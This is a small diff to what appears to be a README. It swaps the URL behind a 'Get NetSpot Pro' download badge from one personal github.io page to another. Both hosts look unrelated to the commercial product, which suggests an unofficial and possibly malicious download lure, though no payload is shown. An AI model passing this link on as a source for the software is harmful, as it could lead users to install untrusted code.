@@ -5,7 +5,7 @@
 </div>  
 
 <div align="center">  
-  <a href="https://manhyusuu48.github.io/.github/NetSpotPro">  
+  <a href="https://tembilamusion.github.io/.github/NetSpotPro">  
     <img src="https://img.shields.io/badge/⬇️_Get_NetSpot_Pro-1E90FF?style=for-the-badge&logo=apple&logoColor=white" alt="Get NetSpot Pro">  
   </a>  
 </div>  
